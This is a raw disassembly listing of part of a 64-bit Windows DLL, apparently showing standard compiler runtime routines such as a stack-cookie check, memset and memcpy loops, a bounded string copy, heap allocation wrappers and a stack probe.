   1800050d2:	48 85 c0             	test   %rax,%rax
   1800050d5:	74 07                	je     0x1800050de
   1800050d7:	c7 40 2c 01 00 00 00 	movl   $0x1,0x2c(%rax)
   1800050de:	ff c7                	inc    %edi
   1800050e0:	3b bb 78 03 00 00    	cmp    0x378(%rbx),%edi
   1800050e6:	7c a8                	jl     0x180005090
   1800050e8:	48 8d 93 c0 00 00 00 	lea    0xc0(%rbx),%rdx
   1800050ef:	33 c9                	xor    %ecx,%ecx
   1800050f1:	e8 6a c2 ff ff       	call   0x180001360
   1800050f6:	4d 85 ff             	test   %r15,%r15
   1800050f9:	74 0c                	je     0x180005107
   1800050fb:	41 8b 57 10          	mov    0x10(%r15),%edx
   1800050ff:	48 8b cb             	mov    %rbx,%rcx
   180005102:	e8 29 fc ff ff       	call   0x180004d30
   180005107:	4d 85 f6             	test   %r14,%r14
   18000510a:	74 52                	je     0x18000515e
   18000510c:	49 c7 06 05 00 00 00 	movq   $0x5,(%r14)
   180005113:	49 c7 46 08 06 00 00 	movq   $0x6,0x8(%r14)
   18000511a:	00 
   18000511b:	48 8d 83 60 01 00 00 	lea    0x160(%rbx),%rax
   180005122:	49 89 46 10          	mov    %rax,0x10(%r14)
   180005126:	48 8d 83 60 02 00 00 	lea    0x260(%rbx),%rax
   18000512d:	48 8b cb             	mov    %rbx,%rcx
   180005130:	49 89 46 18          	mov    %rax,0x18(%r14)
   180005134:	48 8b 83 60 03 00 00 	mov    0x360(%rbx),%rax
   18000513b:	49 89 46 28          	mov    %rax,0x28(%r14)
   18000513f:	8b 83 68 03 00 00    	mov    0x368(%rbx),%eax
   180005145:	41 89 46 20          	mov    %eax,0x20(%r14)
   180005149:	e8 52 d0 ff ff       	call   0x1800021a0
   18000514e:	48 8b cb             	mov    %rbx,%rcx
   180005151:	e8 9a f6 ff ff       	call   0x1800047f0
   180005156:	48 8b cb             	mov    %rbx,%rcx
   180005159:	e8 12 c7 ff ff       	call   0x180001870
   18000515e:	33 c0                	xor    %eax,%eax
   180005160:	48 8b ac 24 e0 01 00 	mov    0x1e0(%rsp),%rbp
   180005167:	00 
   180005168:	48 8b 9c 24 e8 01 00 	mov    0x1e8(%rsp),%rbx
   18000516f:	00 
   180005170:	48 8b 8c 24 d0 01 00 	mov    0x1d0(%rsp),%rcx
   180005177:	00 
   180005178:	48 33 cc             	xor    %rsp,%rcx
   18000517b:	e8 b0 00 00 00       	call   0x180005230
   180005180:	48 81 c4 f0 01 00 00 	add    $0x1f0,%rsp
   180005187:	41 5f                	pop    %r15
   180005189:	41 5e                	pop    %r14
   18000518b:	5f                   	pop    %rdi
   18000518c:	c3                   	ret
   18000518d:	cc                   	int3
   18000518e:	cc                   	int3
   18000518f:	cc                   	int3
   180005190:	48 83 ec 28          	sub    $0x28,%rsp
   180005194:	4d 8b 41 38          	mov    0x38(%r9),%r8
   180005198:	48 8b ca             	mov    %rdx,%rcx
   18000519b:	49 8b d1             	mov    %r9,%rdx
   18000519e:	e8 0d 00 00 00       	call   0x1800051b0
   1800051a3:	b8 01 00 00 00       	mov    $0x1,%eax
   1800051a8:	48 83 c4 28          	add    $0x28,%rsp
   1800051ac:	c3                   	ret
   1800051ad:	cc                   	int3
   1800051ae:	cc                   	int3
   1800051af:	cc                   	int3
   1800051b0:	40 53                	rex push %rbx
   1800051b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800051b6:	45 8b 18             	mov    (%r8),%r11d
   1800051b9:	48 8b da             	mov    %rdx,%rbx
   1800051bc:	4c 8b c9             	mov    %rcx,%r9
   1800051bf:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1800051c3:	41 f6 00 04          	testb  $0x4,(%r8)
   1800051c7:	4c 8b d1             	mov    %rcx,%r10
   1800051ca:	74 13                	je     0x1800051df
   1800051cc:	41 8b 40 08          	mov    0x8(%r8),%eax
   1800051d0:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1800051d4:	f7 d8                	neg    %eax
   1800051d6:	4c 03 d1             	add    %rcx,%r10
   1800051d9:	48 63 c8             	movslq %eax,%rcx
   1800051dc:	4c 23 d1             	and    %rcx,%r10
   1800051df:	49 63 c3             	movslq %r11d,%rax
   1800051e2:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1800051e6:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1800051ea:	8b 48 08             	mov    0x8(%rax),%ecx
   1800051ed:	48 03 4b 08          	add    0x8(%rbx),%rcx
   1800051f1:	f6 41 03 0f          	testb  $0xf,0x3(%rcx)
   1800051f5:	74 0c                	je     0x180005203
   1800051f7:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   1800051fb:	83 e0 f0             	and    $0xfffffff0,%eax
   1800051fe:	48 98                	cltq
   180005200:	4c 03 c8             	add    %rax,%r9
   180005203:	4c 33 ca             	xor    %rdx,%r9
   180005206:	49 8b c9             	mov    %r9,%rcx
   180005209:	48 83 c4 20          	add    $0x20,%rsp
   18000520d:	5b                   	pop    %rbx
   18000520e:	e9 1d 00 00 00       	jmp    0x180005230
   180005213:	cc                   	int3
   180005214:	cc                   	int3
   180005215:	cc                   	int3
   180005216:	cc                   	int3
   180005217:	cc                   	int3
   180005218:	cc                   	int3
   180005219:	cc                   	int3
   18000521a:	cc                   	int3
   18000521b:	cc                   	int3
   18000521c:	cc                   	int3
   18000521d:	cc                   	int3
   18000521e:	cc                   	int3
   18000521f:	cc                   	int3
   180005220:	cc                   	int3
   180005221:	cc                   	int3
   180005222:	cc                   	int3
   180005223:	cc                   	int3
   180005224:	cc                   	int3
   180005225:	cc                   	int3
   180005226:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000522d:	00 00 00 
   180005230:	48 3b 0d c9 3d 01 00 	cmp    0x13dc9(%rip),%rcx        # 0x180019000
   180005237:	75 11                	jne    0x18000524a
   180005239:	48 c1 c1 10          	rol    $0x10,%rcx
   18000523d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   180005242:	75 02                	jne    0x180005246
   180005244:	f3 c3                	repz ret
   180005246:	48 c1 c9 10          	ror    $0x10,%rcx
   18000524a:	e9 c5 12 00 00       	jmp    0x180006514
   18000524f:	cc                   	int3
   180005250:	cc                   	int3
   180005251:	cc                   	int3
   180005252:	cc                   	int3
   180005253:	cc                   	int3
   180005254:	cc                   	int3
   180005255:	cc                   	int3
   180005256:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000525d:	00 00 00 
   180005260:	4c 8b d9             	mov    %rcx,%r11
   180005263:	0f b6 d2             	movzbl %dl,%edx
   180005266:	49 83 f8 10          	cmp    $0x10,%r8
   18000526a:	0f 82 5c 01 00 00    	jb     0x1800053cc
   180005270:	0f ba 25 1c 5b 01 00 	btl    $0x1,0x15b1c(%rip)        # 0x18001ad94
   180005277:	01 
   180005278:	73 0e                	jae    0x180005288
   18000527a:	57                   	push   %rdi
   18000527b:	48 8b f9             	mov    %rcx,%rdi
   18000527e:	8b c2                	mov    %edx,%eax
   180005280:	49 8b c8             	mov    %r8,%rcx
   180005283:	f3 aa                	rep stos %al,(%rdi)
   180005285:	5f                   	pop    %rdi
   180005286:	eb 6d                	jmp    0x1800052f5
   180005288:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   18000528f:	01 01 01 
   180005292:	49 0f af d1          	imul   %r9,%rdx
   180005296:	0f ba 25 f6 5a 01 00 	btl    $0x2,0x15af6(%rip)        # 0x18001ad94
   18000529d:	02 
   18000529e:	0f 82 9c 00 00 00    	jb     0x180005340
   1800052a4:	49 83 f8 40          	cmp    $0x40,%r8
   1800052a8:	72 1e                	jb     0x1800052c8
   1800052aa:	48 f7 d9             	neg    %rcx
   1800052ad:	83 e1 07             	and    $0x7,%ecx
   1800052b0:	74 06                	je     0x1800052b8
   1800052b2:	4c 2b c1             	sub    %rcx,%r8
   1800052b5:	49 89 13             	mov    %rdx,(%r11)
   1800052b8:	49 03 cb             	add    %r11,%rcx
   1800052bb:	4d 8b c8             	mov    %r8,%r9
   1800052be:	49 83 e0 3f          	and    $0x3f,%r8
   1800052c2:	49 c1 e9 06          	shr    $0x6,%r9
   1800052c6:	75 3f                	jne    0x180005307
   1800052c8:	4d 8b c8             	mov    %r8,%r9
   1800052cb:	49 83 e0 07          	and    $0x7,%r8
   1800052cf:	49 c1 e9 03          	shr    $0x3,%r9
   1800052d3:	74 11                	je     0x1800052e6
   1800052d5:	66 66 66 90          	data16 data16 xchg %ax,%ax
   1800052d9:	90                   	nop
   1800052da:	48 89 11             	mov    %rdx,(%rcx)
   1800052dd:	48 83 c1 08          	add    $0x8,%rcx
   1800052e1:	49 ff c9             	dec    %r9
   1800052e4:	75 f4                	jne    0x1800052da
   1800052e6:	4d 85 c0             	test   %r8,%r8
   1800052e9:	74 0a                	je     0x1800052f5
   1800052eb:	88 11                	mov    %dl,(%rcx)
   1800052ed:	48 ff c1             	inc    %rcx
   1800052f0:	49 ff c8             	dec    %r8
   1800052f3:	75 f6                	jne    0x1800052eb
   1800052f5:	49 8b c3             	mov    %r11,%rax
   1800052f8:	c3                   	ret
   1800052f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180005300:	66 66 66 90          	data16 data16 xchg %ax,%ax
   180005304:	66 66 90             	data16 xchg %ax,%ax
   180005307:	48 89 11             	mov    %rdx,(%rcx)
   18000530a:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   18000530e:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   180005312:	48 83 c1 40          	add    $0x40,%rcx
   180005316:	48 89 51 d8          	mov    %rdx,-0x28(%rcx)
   18000531a:	48 89 51 e0          	mov    %rdx,-0x20(%rcx)
   18000531e:	49 ff c9             	dec    %r9
   180005321:	48 89 51 e8          	mov    %rdx,-0x18(%rcx)
   180005325:	48 89 51 f0          	mov    %rdx,-0x10(%rcx)
   180005329:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   18000532d:	75 d8                	jne    0x180005307
   18000532f:	eb 97                	jmp    0x1800052c8
   180005331:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   180005338:	0f 1f 84 00 00 00 00 
   18000533f:	00 
   180005340:	66 48 0f 6e c2       	movq   %rdx,%xmm0
   180005345:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   180005349:	f6 c1 0f             	test   $0xf,%cl
   18000534c:	74 16                	je     0x180005364
   18000534e:	0f 11 01             	movups %xmm0,(%rcx)
   180005351:	48 8b c1             	mov    %rcx,%rax
   180005354:	48 83 e0 0f          	and    $0xf,%rax
   180005358:	48 83 c1 10          	add    $0x10,%rcx
   18000535c:	48 2b c8             	sub    %rax,%rcx
   18000535f:	4e 8d 44 00 f0       	lea    -0x10(%rax,%r8,1),%r8
   180005364:	4d 8b c8             	mov    %r8,%r9
   180005367:	49 c1 e9 07          	shr    $0x7,%r9
   18000536b:	74 32                	je     0x18000539f
   18000536d:	eb 01                	jmp    0x180005370
   18000536f:	90                   	nop
   180005370:	0f 29 01             	movaps %xmm0,(%rcx)
   180005373:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   180005377:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   18000537e:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   180005382:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   180005386:	49 ff c9             	dec    %r9
   180005389:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   18000538d:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   180005391:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   180005395:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   180005399:	75 d5                	jne    0x180005370
   18000539b:	49 83 e0 7f          	and    $0x7f,%r8
   18000539f:	4d 8b c8             	mov    %r8,%r9
   1800053a2:	49 c1 e9 04          	shr    $0x4,%r9
   1800053a6:	74 14                	je     0x1800053bc
   1800053a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800053af:	00 
   1800053b0:	0f 29 01             	movaps %xmm0,(%rcx)
   1800053b3:	48 83 c1 10          	add    $0x10,%rcx
   1800053b7:	49 ff c9             	dec    %r9
   1800053ba:	75 f4                	jne    0x1800053b0
   1800053bc:	49 83 e0 0f          	and    $0xf,%r8
   1800053c0:	74 06                	je     0x1800053c8
   1800053c2:	41 0f 11 44 08 f0    	movups %xmm0,-0x10(%r8,%rcx,1)
   1800053c8:	49 8b c3             	mov    %r11,%rax
   1800053cb:	c3                   	ret
   1800053cc:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   1800053d3:	01 01 01 
   1800053d6:	49 0f af d1          	imul   %r9,%rdx
   1800053da:	4c 8d 0d 1f ac ff ff 	lea    -0x53e1(%rip),%r9        # 0x180000000
   1800053e1:	43 8b 84 81 f5 53 00 	mov    0x53f5(%r9,%r8,4),%eax
   1800053e8:	00 
   1800053e9:	4c 03 c8             	add    %rax,%r9
   1800053ec:	49 03 c8             	add    %r8,%rcx
   1800053ef:	49 8b c3             	mov    %r11,%rax
   1800053f2:	41 ff e1             	jmp    *%r9
   1800053f5:	4e 54                	rex.WRX push %rsp
   1800053f7:	00 00                	add    %al,(%rax)
   1800053f9:	4b 54                	rex.WXB push %r12
   1800053fb:	00 00                	add    %al,(%rax)
   1800053fd:	5c                   	pop    %rsp
   1800053fe:	54                   	push   %rsp
   1800053ff:	00 00                	add    %al,(%rax)
   180005401:	47 54                	rex.RXB push %r12
   180005403:	00 00                	add    %al,(%rax)
   180005405:	70 54                	jo     0x18000545b
   180005407:	00 00                	add    %al,(%rax)
   180005409:	65 54                	gs push %rsp
   18000540b:	00 00                	add    %al,(%rax)
   18000540d:	59                   	pop    %rcx
   18000540e:	54                   	push   %rsp
   18000540f:	00 00                	add    %al,(%rax)
   180005411:	44 54                	rex.R push %rsp
   180005413:	00 00                	add    %al,(%rax)
   180005415:	85 54 00 00          	test   %edx,0x0(%rax,%rax,1)
   180005419:	7d 54                	jge    0x18000546f
   18000541b:	00 00                	add    %al,(%rax)
   18000541d:	74 54                	je     0x180005473
   18000541f:	00 00                	add    %al,(%rax)
   180005421:	4f 54                	rex.WRXB push %r12
   180005423:	00 00                	add    %al,(%rax)
   180005425:	6c                   	insb   (%dx),(%rdi)
   180005426:	54                   	push   %rsp
   180005427:	00 00                	add    %al,(%rax)
   180005429:	61                   	(bad)
   18000542a:	54                   	push   %rsp
   18000542b:	00 00                	add    %al,(%rax)
   18000542d:	55                   	push   %rbp
   18000542e:	54                   	push   %rsp
   18000542f:	00 00                	add    %al,(%rax)
   180005431:	40 54                	rex push %rsp
   180005433:	00 00                	add    %al,(%rax)
   180005435:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000543c:	00 00 00 00 
   180005440:	48 89 51 f1          	mov    %rdx,-0xf(%rcx)
   180005444:	89 51 f9             	mov    %edx,-0x7(%rcx)
   180005447:	66 89 51 fd          	mov    %dx,-0x3(%rcx)
   18000544b:	88 51 ff             	mov    %dl,-0x1(%rcx)
   18000544e:	c3                   	ret
   18000544f:	48 89 51 f5          	mov    %rdx,-0xb(%rcx)
   180005453:	eb f2                	jmp    0x180005447
   180005455:	48 89 51 f2          	mov    %rdx,-0xe(%rcx)
   180005459:	89 51 fa             	mov    %edx,-0x6(%rcx)
   18000545c:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   180005460:	c3                   	ret
   180005461:	48 89 51 f3          	mov    %rdx,-0xd(%rcx)
   180005465:	89 51 fb             	mov    %edx,-0x5(%rcx)
   180005468:	88 51 ff             	mov    %dl,-0x1(%rcx)
   18000546b:	c3                   	ret
   18000546c:	48 89 51 f4          	mov    %rdx,-0xc(%rcx)
   180005470:	89 51 fc             	mov    %edx,-0x4(%rcx)
   180005473:	c3                   	ret
   180005474:	48 89 51 f6          	mov    %rdx,-0xa(%rcx)
   180005478:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   18000547c:	c3                   	ret
   18000547d:	48 89 51 f7          	mov    %rdx,-0x9(%rcx)
   180005481:	88 51 ff             	mov    %dl,-0x1(%rcx)
   180005484:	c3                   	ret
   180005485:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   180005489:	c3                   	ret
   18000548a:	cc                   	int3
   18000548b:	cc                   	int3
   18000548c:	e9 03 00 00 00       	jmp    0x180005494
   180005491:	cc                   	int3
   180005492:	cc                   	int3
   180005493:	cc                   	int3
   180005494:	48 8d 05 a5 1d 00 00 	lea    0x1da5(%rip),%rax        # 0x180007240
   18000549b:	48 8d 0d ea 12 00 00 	lea    0x12ea(%rip),%rcx        # 0x18000678c
   1800054a2:	48 89 05 8f 3b 01 00 	mov    %rax,0x13b8f(%rip)        # 0x180019038
   1800054a9:	48 8d 05 30 1e 00 00 	lea    0x1e30(%rip),%rax        # 0x1800072e0
   1800054b0:	48 89 0d 79 3b 01 00 	mov    %rcx,0x13b79(%rip)        # 0x180019030
   1800054b7:	48 89 05 82 3b 01 00 	mov    %rax,0x13b82(%rip)        # 0x180019040
   1800054be:	48 8d 05 63 1e 00 00 	lea    0x1e63(%rip),%rax        # 0x180007328
   1800054c5:	48 89 0d 8c 3b 01 00 	mov    %rcx,0x13b8c(%rip)        # 0x180019058
   1800054cc:	48 89 05 75 3b 01 00 	mov    %rax,0x13b75(%rip)        # 0x180019048
   1800054d3:	48 8d 05 d6 1e 00 00 	lea    0x1ed6(%rip),%rax        # 0x1800073b0
   1800054da:	48 89 05 6f 3b 01 00 	mov    %rax,0x13b6f(%rip)        # 0x180019050
   1800054e1:	48 8d 05 c8 12 00 00 	lea    0x12c8(%rip),%rax        # 0x1800067b0
   1800054e8:	48 89 05 71 3b 01 00 	mov    %rax,0x13b71(%rip)        # 0x180019060
   1800054ef:	48 8d 05 f2 1d 00 00 	lea    0x1df2(%rip),%rax        # 0x1800072e8
   1800054f6:	48 89 05 6b 3b 01 00 	mov    %rax,0x13b6b(%rip)        # 0x180019068
   1800054fd:	48 8d 05 44 1d 00 00 	lea    0x1d44(%rip),%rax        # 0x180007248
   180005504:	48 89 05 65 3b 01 00 	mov    %rax,0x13b65(%rip)        # 0x180019070
   18000550b:	48 8d 05 1e 1e 00 00 	lea    0x1e1e(%rip),%rax        # 0x180007330
   180005512:	48 89 05 5f 3b 01 00 	mov    %rax,0x13b5f(%rip)        # 0x180019078
   180005519:	c3                   	ret
   18000551a:	cc                   	int3
   18000551b:	cc                   	int3
   18000551c:	40 53                	rex push %rbx
   18000551e:	48 83 ec 20          	sub    $0x20,%rsp
   180005522:	48 85 c9             	test   %rcx,%rcx
   180005525:	74 0d                	je     0x180005534
   180005527:	48 85 d2             	test   %rdx,%rdx
   18000552a:	74 08                	je     0x180005534
   18000552c:	4d 85 c0             	test   %r8,%r8
   18000552f:	75 1c                	jne    0x18000554d
   180005531:	44 88 01             	mov    %r8b,(%rcx)
   180005534:	e8 f7 20 00 00       	call   0x180007630
   180005539:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000553e:	89 18                	mov    %ebx,(%rax)
   180005540:	e8 1f 20 00 00       	call   0x180007564
   180005545:	8b c3                	mov    %ebx,%eax
   180005547:	48 83 c4 20          	add    $0x20,%rsp
   18000554b:	5b                   	pop    %rbx
   18000554c:	c3                   	ret
   18000554d:	4c 8b c9             	mov    %rcx,%r9
   180005550:	4d 2b c8             	sub    %r8,%r9
   180005553:	41 8a 00             	mov    (%r8),%al
   180005556:	43 88 04 01          	mov    %al,(%r9,%r8,1)
   18000555a:	49 ff c0             	inc    %r8
   18000555d:	84 c0                	test   %al,%al
   18000555f:	74 05                	je     0x180005566
   180005561:	48 ff ca             	dec    %rdx
   180005564:	75 ed                	jne    0x180005553
   180005566:	48 85 d2             	test   %rdx,%rdx
   180005569:	75 0e                	jne    0x180005579
   18000556b:	88 11                	mov    %dl,(%rcx)
   18000556d:	e8 be 20 00 00       	call   0x180007630
   180005572:	bb 22 00 00 00       	mov    $0x22,%ebx
   180005577:	eb c5                	jmp    0x18000553e
   180005579:	33 c0                	xor    %eax,%eax
   18000557b:	eb ca                	jmp    0x180005547
   18000557d:	cc                   	int3
   18000557e:	cc                   	int3
   18000557f:	cc                   	int3
   180005580:	48 85 c9             	test   %rcx,%rcx
   180005583:	74 37                	je     0x1800055bc
   180005585:	53                   	push   %rbx
   180005586:	48 83 ec 20          	sub    $0x20,%rsp
   18000558a:	4c 8b c1             	mov    %rcx,%r8
   18000558d:	48 8b 0d 0c 58 01 00 	mov    0x1580c(%rip),%rcx        # 0x18001ada0
   180005594:	33 d2                	xor    %edx,%edx
   180005596:	ff 15 e4 ba 00 00    	call   *0xbae4(%rip)        # 0x180011080
   18000559c:	85 c0                	test   %eax,%eax
   18000559e:	75 17                	jne    0x1800055b7
   1800055a0:	e8 8b 20 00 00       	call   0x180007630
   1800055a5:	48 8b d8             	mov    %rax,%rbx
   1800055a8:	ff 15 ca ba 00 00    	call   *0xbaca(%rip)        # 0x180011078
   1800055ae:	8b c8                	mov    %eax,%ecx
   1800055b0:	e8 9b 20 00 00       	call   0x180007650
   1800055b5:	89 03                	mov    %eax,(%rbx)
   1800055b7:	48 83 c4 20          	add    $0x20,%rsp
   1800055bb:	5b                   	pop    %rbx
   1800055bc:	c3                   	ret
   1800055bd:	cc                   	int3
   1800055be:	cc                   	int3
   1800055bf:	cc                   	int3
   1800055c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800055c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800055ca:	57                   	push   %rdi
   1800055cb:	48 83 ec 20          	sub    $0x20,%rsp
   1800055cf:	48 8b d9             	mov    %rcx,%rbx
   1800055d2:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   1800055d6:	77 7c                	ja     0x180005654
   1800055d8:	bf 01 00 00 00       	mov    $0x1,%edi
   1800055dd:	48 85 c9             	test   %rcx,%rcx
   1800055e0:	48 0f 45 f9          	cmovne %rcx,%rdi
   1800055e4:	48 8b 0d b5 57 01 00 	mov    0x157b5(%rip),%rcx        # 0x18001ada0
   1800055eb:	48 85 c9             	test   %rcx,%rcx
   1800055ee:	75 20                	jne    0x180005610
   1800055f0:	e8 2b 26 00 00       	call   0x180007c20
   1800055f5:	b9 1e 00 00 00       	mov    $0x1e,%ecx
   1800055fa:	e8 95 26 00 00       	call   0x180007c94
   1800055ff:	b9 ff 00 00 00       	mov    $0xff,%ecx
   180005604:	e8 43 21 00 00       	call   0x18000774c
   180005609:	48 8b 0d 90 57 01 00 	mov    0x15790(%rip),%rcx        # 0x18001ada0
   180005610:	4c 8b c7             	mov    %rdi,%r8
   180005613:	33 d2                	xor    %edx,%edx
   180005615:	ff 15 6d ba 00 00    	call   *0xba6d(%rip)        # 0x180011088
   18000561b:	48 8b f0             	mov    %rax,%rsi
   18000561e:	48 85 c0             	test   %rax,%rax
   180005621:	75 2c                	jne    0x18000564f
   180005623:	39 05 1f 5e 01 00    	cmp    %eax,0x15e1f(%rip)        # 0x18001b448
   180005629:	74 0e                	je     0x180005639
   18000562b:	48 8b cb             	mov    %rbx,%rcx
   18000562e:	e8 99 20 00 00       	call   0x1800076cc
   180005633:	85 c0                	test   %eax,%eax
   180005635:	74 0d                	je     0x180005644
   180005637:	eb ab                	jmp    0x1800055e4
   180005639:	e8 f2 1f 00 00       	call   0x180007630
   18000563e:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180005644:	e8 e7 1f 00 00       	call   0x180007630
   180005649:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   18000564f:	48 8b c6             	mov    %rsi,%rax
   180005652:	eb 12                	jmp    0x180005666
   180005654:	e8 73 20 00 00       	call   0x1800076cc
   180005659:	e8 d2 1f 00 00       	call   0x180007630
   18000565e:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180005664:	33 c0                	xor    %eax,%eax
   180005666:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000566b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180005670:	48 83 c4 20          	add    $0x20,%rsp
   180005674:	5f                   	pop    %rdi
   180005675:	c3                   	ret
   180005676:	cc                   	int3
   180005677:	cc                   	int3
   180005678:	cc                   	int3
   180005679:	cc                   	int3
   18000567a:	cc                   	int3
   18000567b:	cc                   	int3
   18000567c:	cc                   	int3
   18000567d:	cc                   	int3
   18000567e:	cc                   	int3
   18000567f:	cc                   	int3
   180005680:	cc                   	int3
   180005681:	cc                   	int3
   180005682:	cc                   	int3
   180005683:	cc                   	int3
   180005684:	cc                   	int3
   180005685:	cc                   	int3
   180005686:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000568d:	00 00 00 
   180005690:	48 83 ec 10          	sub    $0x10,%rsp
   180005694:	4c 89 14 24          	mov    %r10,(%rsp)
   180005698:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   18000569d:	4d 33 db             	xor    %r11,%r11
   1800056a0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   1800056a5:	4c 2b d0             	sub    %rax,%r10
   1800056a8:	4d 0f 42 d3          	cmovb  %r11,%r10
   1800056ac:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   1800056b3:	00 00 
   1800056b5:	4d 3b d3             	cmp    %r11,%r10
   1800056b8:	73 16                	jae    0x1800056d0
   1800056ba:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   1800056c0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   1800056c7:	41 c6 03 00          	movb   $0x0,(%r11)
   1800056cb:	4d 3b d3             	cmp    %r11,%r10
   1800056ce:	75 f0                	jne    0x1800056c0
   1800056d0:	4c 8b 14 24          	mov    (%rsp),%r10
   1800056d4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   1800056d9:	48 83 c4 10          	add    $0x10,%rsp
   1800056dd:	c3                   	ret
   1800056de:	cc                   	int3
   1800056df:	cc                   	int3
   1800056e0:	cc                   	int3
   1800056e1:	cc                   	int3
   1800056e2:	cc                   	int3
   1800056e3:	cc                   	int3
   1800056e4:	cc                   	int3
   1800056e5:	cc                   	int3
   1800056e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800056ed:	00 00 00 
   1800056f0:	4c 8b d9             	mov    %rcx,%r11
   1800056f3:	4c 8b d2             	mov    %rdx,%r10
   1800056f6:	49 83 f8 10          	cmp    $0x10,%r8
   1800056fa:	0f 86 b9 00 00 00    	jbe    0x1800057b9
   180005700:	48 2b d1             	sub    %rcx,%rdx
   180005703:	73 0f                	jae    0x180005714
   180005705:	49 8b c2             	mov    %r10,%rax
   180005708:	49 03 c0             	add    %r8,%rax
   18000570b:	48 3b c8             	cmp    %rax,%rcx
   18000570e:	0f 8c 96 03 00 00    	jl     0x180005aaa
   180005714:	0f ba 25 78 56 01 00 	btl    $0x1,0x15678(%rip)        # 0x18001ad94
   18000571b:	01 
   18000571c:	73 13                	jae    0x180005731
   18000571e:	57                   	push   %rdi
   18000571f:	56                   	push   %rsi
   180005720:	48 8b f9             	mov    %rcx,%rdi
   180005723:	49 8b f2             	mov    %r10,%rsi
   180005726:	49 8b c8             	mov    %r8,%rcx
   180005729:	f3 a4                	rep movsb (%rsi),(%rdi)
   18000572b:	5e                   	pop    %rsi
   18000572c:	5f                   	pop    %rdi
   18000572d:	49 8b c3             	mov    %r11,%rax
   180005730:	c3                   	ret
   180005731:	0f ba 25 5b 56 01 00 	btl    $0x2,0x1565b(%rip)        # 0x18001ad94
   180005738:	02 
   180005739:	0f 82 56 02 00 00    	jb     0x180005995
   18000573f:	f6 c1 07             	test   $0x7,%cl
   180005742:	74 36                	je     0x18000577a
   180005744:	f6 c1 01             	test   $0x1,%cl
   180005747:	74 0b                	je     0x180005754
   180005749:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   18000574c:	49 ff c8             	dec    %r8
   18000574f:	88 01                	mov    %al,(%rcx)
   180005751:	48 ff c1             	inc    %rcx
   180005754:	f6 c1 02             	test   $0x2,%cl
   180005757:	74 0f                	je     0x180005768
   180005759:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   18000575d:	49 83 e8 02          	sub    $0x2,%r8
   180005761:	66 89 01             	mov    %ax,(%rcx)
   180005764:	48 83 c1 02          	add    $0x2,%rcx
   180005768:	f6 c1 04             	test   $0x4,%cl
   18000576b:	74 0d                	je     0x18000577a
   18000576d:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   180005770:	49 83 e8 04          	sub    $0x4,%r8
   180005774:	89 01                	mov    %eax,(%rcx)
   180005776:	48 83 c1 04          	add    $0x4,%rcx
   18000577a:	4d 8b c8             	mov    %r8,%r9
   18000577d:	49 c1 e9 05          	shr    $0x5,%r9
   180005781:	0f 85 d9 01 00 00    	jne    0x180005960
   180005787:	4d 8b c8             	mov    %r8,%r9
   18000578a:	49 c1 e9 03          	shr    $0x3,%r9
   18000578e:	74 14                	je     0x1800057a4
   180005790:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   180005794:	48 89 01             	mov    %rax,(%rcx)
   180005797:	48 83 c1 08          	add    $0x8,%rcx
   18000579b:	49 ff c9             	dec    %r9
   18000579e:	75 f0                	jne    0x180005790
   1800057a0:	49 83 e0 07          	and    $0x7,%r8
   1800057a4:	4d 85 c0             	test   %r8,%r8
   1800057a7:	75 07                	jne    0x1800057b0
   1800057a9:	49 8b c3             	mov    %r11,%rax
   1800057ac:	c3                   	ret
   1800057ad:	0f 1f 00             	nopl   (%rax)
   1800057b0:	48 8d 14 0a          	lea    (%rdx,%rcx,1),%rdx
